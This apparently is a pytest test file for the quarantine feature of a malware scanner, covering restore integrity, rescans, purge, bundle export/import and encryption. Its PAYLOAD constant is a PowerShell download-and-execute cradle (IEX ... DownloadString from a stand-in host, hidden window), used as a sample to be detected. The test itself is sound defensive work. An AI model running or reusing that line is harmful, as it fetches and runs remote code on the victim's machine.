"""Quarantine: integrity-checked restore, rescan, purge/expiry, export/import,
and optional authenticated encryption."""

from __future__ import annotations

import hashlib
import json
import os
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from typer.testing import CliRunner

import warden.quarantine as qmod
from warden import secrets
from warden.cli import app
from warden.config import Config
from warden.models import FileResult, Finding, Severity
from warden.quarantine import Quarantine, QuarantineError, parse_age

runner = CliRunner()
PAYLOAD = b"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')  # -nop -w hidden\n"


@pytest.fixture()
def fake_secrets(monkeypatch):
    """An in-memory secret store, so tests never touch a real keychain."""
    store: dict[str, str] = {}
    monkeypatch.setattr(secrets, "load_secret", lambda name: store.get(name))
    monkeypatch.setattr(secrets, "store_secret", lambda name, value: store.__setitem__(name, value))
    monkeypatch.setattr(secrets, "delete_secret", lambda name: store.pop(name, None))
    return store


def _cfg(tmp_path, **kw) -> Config:
    cfg = Config(data_dir=tmp_path / "data")
    for k, v in kw.items():
        setattr(cfg, k, v)
    return cfg


def _victim(tmp_path: Path, name: str = "bad.ps1", data: bytes = PAYLOAD) -> FileResult:
    f = tmp_path / name
    f.write_bytes(data)
    return FileResult(path=str(f), size=len(data), sha256=hashlib.sha256(data).hexdigest(),
                      findings=[Finding("yara", "Test_Rule", Severity.HIGH, "test")])


def _backdate(q: Quarantine, entry_id: str, days: float) -> None:
    index = q._load_index()
    when = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
    for e in index:
        if e["id"] == entry_id:
            e["quarantined_at"] = when
    q._save_index(index)


# -- integrity-checked restore ------------------------------------------
def test_restore_verifies_content_hash(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    result = _victim(tmp_path)
    entry = q.quarantine_file(result)
    blob = q.dir / f"{entry.id}.qbin"
    raw = bytearray(blob.read_bytes())
    raw[5] ^= 0xFF                                   # corrupt the stored copy
    blob.write_bytes(bytes(raw))

    with pytest.raises(QuarantineError, match="does not match its recorded hash"):
        q.restore(entry.id)
    assert not Path(result.path).exists()            # nothing half-restored
    assert not list(Path(result.path).parent.glob(".qtmp-*"))
    assert q.list_entries()[0].restored is False


def test_restore_never_clobbers_even_if_target_appears(tmp_path, monkeypatch):
    q = Quarantine(_cfg(tmp_path))
    result = _victim(tmp_path)
    entry = q.quarantine_file(result)
    target = Path(result.path)
    real_publish = qmod._publish

    def racing_publish(tmp, dst, *, clobber):
        Path(dst).write_bytes(b"someone else's file")   # appears after the exists() check
        return real_publish(tmp, dst, clobber=clobber)

    monkeypatch.setattr(qmod, "_publish", racing_publish)
    with pytest.raises(QuarantineError, match="already exists"):
        q.restore(entry.id)
    assert target.read_bytes() == b"someone else's file"


def test_ids_cannot_escape_the_quarantine_dir(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    outside = tmp_path / "data" / "secret.qbin"
    outside.write_bytes(b"x")
    q._save_index([{"id": "../secret", "original_path": str(tmp_path / "o"), "quarantined_at": "x",
                    "size": 1, "sha256": None, "verdict": "High"}])
    with pytest.raises(QuarantineError):
        q.restore("../secret", tmp_path / "out.bin")
    with pytest.raises(QuarantineError):
        q.read_bytes("../secret")
    q.delete("../secret")                            # index entry goes; no file outside is touched
    assert outside.exists()


# -- rescan --------------------------------------------------------------
def test_rescan_reports_current_verdict_and_records_it(tmp_path):
    cfg = _cfg(tmp_path)
    q = Quarantine(cfg)
    result = _victim(tmp_path)
    entry = q.quarantine_file(result)

    again = q.rescan(entry.id)
    assert again.is_threat                           # script heuristics still fire
    assert not Path(result.path).exists()            # still isolated - rescan writes nothing out
    stored = q.list_entries()[0]
    assert stored.last_rescan["threat"] is True and stored.last_rescan["verdict"]


def test_rescan_clean_item_is_no_longer_flagged(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    entry = q.quarantine_file(_victim(tmp_path, "report.txt", b"quarterly numbers, nothing else"))
    again = q.rescan(entry.id)
    assert not again.is_threat
    assert q.list_entries()[0].last_rescan["threat"] is False


def test_rescan_detects_damaged_blob(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    entry = q.quarantine_file(_victim(tmp_path))
    blob = q.dir / f"{entry.id}.qbin"
    blob.write_bytes(blob.read_bytes()[:-3])
    with pytest.raises(QuarantineError, match="recorded hash"):
        q.rescan(entry.id)
    with pytest.raises(QuarantineError):
        q.rescan("0123456789abcdef")


# -- purge / expiry ------------------------------------------------------
def test_parse_age():
    assert parse_age("30d") == 30 and parse_age("2w") == 14 and parse_age("12h") == 0.5
    assert parse_age("7") == 7
    for bad in ("", "soon", "-3d", "3 months"):
        with pytest.raises(ValueError):
            parse_age(bad)


def test_purge_selects_by_age_and_state(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    old = q.quarantine_file(_victim(tmp_path, "old.ps1", PAYLOAD + b"1"))
    new = q.quarantine_file(_victim(tmp_path, "new.ps1", PAYLOAD + b"2"))
    done = q.quarantine_file(_victim(tmp_path, "done.ps1", PAYLOAD + b"3"))
    _backdate(q, old.id, 40)
    q.restore(done.id)

    assert q.purge() == []                                         # no criteria: nothing
    assert [e.id for e in q.purge(older_than_days=30, dry_run=True)] == [old.id]
    assert len(q.list_entries()) == 3                               # dry run deleted nothing

    assert [e.id for e in q.purge(older_than_days=30)] == [old.id]
    assert not (q.dir / f"{old.id}.qbin").exists() and not (q.dir / f"{old.id}.json").exists()
    assert [e.id for e in q.purge(restored_only=True)] == [done.id]
    assert [e.id for e in q.list_entries()] == [new.id]
    assert [e.id for e in q.purge(everything=True)] == [new.id]
    assert q.list_entries() == []


def test_purge_cli_requires_choice_and_confirmation(home, tmp_path):
    q = Quarantine()
    entry = q.quarantine_file(_victim(tmp_path))
    _backdate(q, entry.id, 10)

    assert runner.invoke(app, ["quarantine", "purge"]).exit_code == 2
    assert runner.invoke(app, ["quarantine", "purge", "--older-than", "nonsense"]).exit_code == 2
    assert runner.invoke(app, ["quarantine", "purge", "--expired"]).exit_code == 2   # no retention set

    res = runner.invoke(app, ["quarantine", "purge", "--older-than", "5d"], input="n\n")
    assert "Cancelled" in res.output and len(Quarantine().list_entries()) == 1
    res = runner.invoke(app, ["quarantine", "purge", "--older-than", "5d", "--dry-run"])
    assert "would be permanently deleted" in res.output and len(Quarantine().list_entries()) == 1

    runner.invoke(app, ["config", "set", "quarantine_retention_days", "7"])
    res = runner.invoke(app, ["quarantine", "purge", "--expired", "--yes"])
    assert res.exit_code == 0 and "Deleted" in res.output
    assert Quarantine().list_entries() == []


# -- export / import -----------------------------------------------------
def test_export_bundle_is_neutralized_and_imports_elsewhere(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    entry = q.quarantine_file(_victim(tmp_path))
    bundle = q.export(entry.id, tmp_path / "sample.wq")

    raw = bundle.read_bytes()
    assert PAYLOAD not in raw                                   # not the live file
    with zipfile.ZipFile(bundle) as zf:
        assert set(zf.namelist()) == {"entry.json", "payload.xor"}
        assert PAYLOAD not in zf.read("payload.xor")
        assert json.loads(zf.read("entry.json"))["sha256"] == entry.sha256
    with pytest.raises(QuarantineError, match="already exists"):
        q.export(entry.id, bundle)

    other = Quarantine(Config(data_dir=tmp_path / "other-machine"))
    imported = other.import_bundle(bundle)
    assert imported.imported and imported.sha256 == entry.sha256 and imported.id != entry.id
    assert other.read_bytes(imported.id) == PAYLOAD

    # The bundle's recorded path is untrusted: restoring needs an explicit destination.
    with pytest.raises(QuarantineError, match="--to"):
        other.restore(imported.id)
    out = other.restore(imported.id, tmp_path / "restored.bin")
    assert out.read_bytes() == PAYLOAD


def test_password_protected_bundle(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    entry = q.quarantine_file(_victim(tmp_path))
    bundle = q.export(entry.id, tmp_path / "sealed.wq", password="correct horse")
    raw = bundle.read_bytes()
    assert raw[:4] == b"WQX1" and b"entry.json" not in raw      # metadata is hidden too

    other = Quarantine(Config(data_dir=tmp_path / "other"))
    with pytest.raises(QuarantineError, match="password-protected"):
        other.import_bundle(bundle)
    with pytest.raises(QuarantineError, match="integrity check"):
        other.import_bundle(bundle, password="wrong")
    tampered = tmp_path / "tampered.wq"
    data = bytearray(raw)
    data[-1] ^= 0x01
    tampered.write_bytes(bytes(data))
    with pytest.raises(QuarantineError, match="integrity check"):
        other.import_bundle(tampered, password="correct horse")
    assert other.list_entries() == []
    assert not list(other.dir.glob(".import-*"))                 # no debris after failures

    imported = other.import_bundle(bundle, password="correct horse")
    assert other.read_bytes(imported.id) == PAYLOAD


def _make_bundle(path: Path, meta: dict, payload: bytes) -> Path:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("entry.json", json.dumps(meta))
        zf.writestr("payload.xor", payload.translate(qmod._XOR_TABLE))
    return path


def test_import_rejects_malformed_bundles(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    sha = hashlib.sha256(PAYLOAD).hexdigest()
    good = {"bundle_format": 1, "sha256": sha, "size": len(PAYLOAD), "verdict": "High",
            "original_path": "/x/y", "findings": []}
    cases = {
        "wrong-hash": ({**good, "sha256": "0" * 64}, PAYLOAD),
        "wrong-size": ({**good, "size": len(PAYLOAD) - 1}, PAYLOAD),
        "bad-format": ({**good, "bundle_format": 9}, PAYLOAD),
        "bad-sha": ({**good, "sha256": "../../etc"}, PAYLOAD),
        "neg-size": ({**good, "size": -1}, PAYLOAD),
        "bool-size": ({**good, "size": True}, PAYLOAD),
    }
    for name, (meta, payload) in cases.items():
        with pytest.raises(QuarantineError):
            q.import_bundle(_make_bundle(tmp_path / f"{name}.wq", meta, payload))
    (tmp_path / "junk.wq").write_bytes(b"this is not a bundle")
    with pytest.raises(QuarantineError):
        q.import_bundle(tmp_path / "junk.wq")
    with zipfile.ZipFile(tmp_path / "empty.wq", "w") as zf:
        zf.writestr("other.txt", "x")
    with pytest.raises(QuarantineError):
        q.import_bundle(tmp_path / "empty.wq")
    with pytest.raises(QuarantineError):
        q.import_bundle(tmp_path / "does-not-exist.wq")
    assert q.list_entries() == [] and not list(q.dir.glob("*.qbin"))


def test_import_sanitizes_metadata(tmp_path):
    q = Quarantine(_cfg(tmp_path))
    meta = {"bundle_format": 1, "sha256": hashlib.sha256(PAYLOAD).hexdigest(), "size": len(PAYLOAD),
            "verdict": "High\x1b[31m", "original_path": "C:\\evil\n\x07path",
            "findings": ["not-a-dict", {"name": "ok"}], "id": "../../x", "restored": True}
    entry = q.import_bundle(_make_bundle(tmp_path / "b.wq", meta, PAYLOAD))
    assert "\x1b" not in entry.verdict and "\n" not in entry.original_path
    assert entry.findings == [{"name": "ok"}]
    assert entry.restored is False and qmod._ID_RE.match(entry.id)   # never the bundle's own id/state


# -- authenticated encryption -------------------------------------------
def test_encrypted_quarantine_roundtrip(tmp_path, fake_secrets):
    q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    result = _victim(tmp_path)
    entry = q.quarantine_file(result)
    assert entry.encrypted and "quarantine_key" in fake_secrets
    blob = q.dir / f"{entry.id}.qenc"
    stored = blob.read_bytes()
    assert stored[:4] == b"WQE1" and PAYLOAD not in stored
    assert PAYLOAD.translate(qmod._XOR_TABLE) not in stored      # really encrypted, not XOR
    assert not (q.dir / f"{entry.id}.qbin").exists()

    assert q.read_bytes(entry.id) == PAYLOAD
    assert q.rescan(entry.id).is_threat
    assert q.restore(entry.id).read_bytes() == PAYLOAD


@pytest.mark.parametrize("size", [0, 1, qmod._CHUNK - 1, qmod._CHUNK, qmod._CHUNK + 1, 2 * qmod._CHUNK])
def test_encryption_chunk_boundaries(tmp_path, fake_secrets, size):
    data = os.urandom(size)
    q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    entry = q.quarantine_file(_victim(tmp_path, "blob.bin", data))
    assert q.read_bytes(entry.id) == data


def test_encrypted_blob_tampering_is_detected(tmp_path, fake_secrets):
    q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    data = os.urandom(2 * qmod._CHUNK + 100)
    result = _victim(tmp_path, "big.bin", data)
    entry = q.quarantine_file(result)
    blob = q.dir / f"{entry.id}.qenc"
    original = blob.read_bytes()
    enc_chunk = qmod._CHUNK + 16

    variants = {
        "bit-flip": original[:500] + bytes([original[500] ^ 1]) + original[501:],
        "truncated-chunk": original[:20 + 2 * enc_chunk],                 # final chunk dropped
        "truncated-bytes": original[:-5],
        "reordered": original[:20] + original[20 + enc_chunk:20 + 2 * enc_chunk]
                     + original[20:20 + enc_chunk] + original[20 + 2 * enc_chunk:],
        "bad-magic": b"XXXX" + original[4:],
    }
    for name, mutated in variants.items():
        blob.write_bytes(mutated)
        with pytest.raises(QuarantineError):
            q.restore(entry.id)
        assert not Path(result.path).exists(), name
    blob.write_bytes(original)
    assert q.restore(entry.id).read_bytes() == data


def test_blob_cannot_be_swapped_between_entries(tmp_path, fake_secrets):
    """Ciphertext is bound to its entry id: one sealed blob can't stand in for another."""
    q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    a = q.quarantine_file(_victim(tmp_path, "a.bin", b"A" * 100))
    b = q.quarantine_file(_victim(tmp_path, "b.bin", b"B" * 100))
    (q.dir / f"{a.id}.qenc").write_bytes((q.dir / f"{b.id}.qenc").read_bytes())
    with pytest.raises(QuarantineError, match="integrity check"):
        q.read_bytes(a.id)


def test_encrypted_items_need_the_key(tmp_path, fake_secrets):
    q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    entry = q.quarantine_file(_victim(tmp_path))
    fake_secrets.clear()
    with pytest.raises(QuarantineError, match="key is missing"):
        q.read_bytes(entry.id)
    fake_secrets["quarantine_key"] = "not-a-valid-key"
    with pytest.raises(QuarantineError, match="damaged"):
        q.read_bytes(entry.id)


def test_refuses_to_seal_if_key_cannot_be_saved(tmp_path, monkeypatch):
    monkeypatch.setattr(secrets, "load_secret", lambda name: None)
    monkeypatch.setattr(secrets, "store_secret", lambda name, value: None)   # silently loses it
    q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    result = _victim(tmp_path)
    with pytest.raises(QuarantineError, match="could not save"):
        q.quarantine_file(result)
    assert Path(result.path).exists()                # original untouched


def test_mixed_formats_coexist_and_export_from_encrypted(tmp_path, fake_secrets):
    plain_q = Quarantine(_cfg(tmp_path))
    plain = plain_q.quarantine_file(_victim(tmp_path, "p.ps1", PAYLOAD + b"p"))
    enc_q = Quarantine(_cfg(tmp_path, quarantine_encryption=True))
    enc = enc_q.quarantine_file(_victim(tmp_path, "e.ps1", PAYLOAD + b"e"))
    assert enc_q.read_bytes(plain.id) == PAYLOAD + b"p"         # old XOR items still open
    assert plain_q.read_bytes(enc.id) == PAYLOAD + b"e"

    bundle = enc_q.export(enc.id, tmp_path / "e.wq")            # portable: no machine key needed
    other = Quarantine(Config(data_dir=tmp_path / "other"))
    fake_secrets.clear()
    assert other.read_bytes(other.import_bundle(bundle).id) == PAYLOAD + b"e"


# -- CLI -----------------------------------------------------------------
def test_cli_restore_with_rescan_prompts_when_still_flagged(home, tmp_path):
    q = Quarantine()
    result = _victim(tmp_path)
    entry = q.quarantine_file(result)

    res = runner.invoke(app, ["quarantine", "restore", entry.id, "--rescan"], input="n\n")
    assert res.exit_code == 1 and "still detected" in res.output
    assert not Path(result.path).exists()

    res = runner.invoke(app, ["quarantine", "restore", entry.id, "--rescan", "--yes"])
    assert res.exit_code == 0 and Path(result.path).read_bytes() == PAYLOAD


def test_cli_restore_with_rescan_is_silent_when_clean(home, tmp_path):
    q = Quarantine()
    result = _victim(tmp_path, "notes.txt", b"harmless text")
    entry = q.quarantine_file(result)
    res = runner.invoke(app, ["quarantine", "restore", entry.id, "--rescan"])
    assert res.exit_code == 0 and "no longer detected" in res.output
    assert Path(result.path).exists()


def test_cli_rescan_all_export_import(home, tmp_path, monkeypatch):
    q = Quarantine()
    bad = q.quarantine_file(_victim(tmp_path))
    q.quarantine_file(_victim(tmp_path, "ok.txt", b"fine"))

    res = runner.invoke(app, ["quarantine", "rescan", "--all"])
    assert res.exit_code == 1 and "still detected" in res.output and "no longer detected" in res.output
    assert runner.invoke(app, ["quarantine", "rescan"]).exit_code == 2
    assert runner.invoke(app, ["quarantine", "list"]).exit_code == 0
    assert {e.last_rescan["threat"] for e in Quarantine().list_entries()} == {True, False}

    monkeypatch.setenv("WARDEN_BUNDLE_PASSWORD", "pw123")
    out = tmp_path / "s.wq"
    assert runner.invoke(app, ["quarantine", "export", bad.id, str(out), "--password"]).exit_code == 0
    assert out.read_bytes()[:4] == b"WQX1"
    res = runner.invoke(app, ["quarantine", "import", str(out), "--password"])
    assert res.exit_code == 0 and "Imported" in res.output
    assert runner.invoke(app, ["quarantine", "import", str(out)]).exit_code == 2     # no password
    assert runner.invoke(app, ["quarantine", "export", "0000000000000000", str(tmp_path / "n.wq")]).exit_code == 2
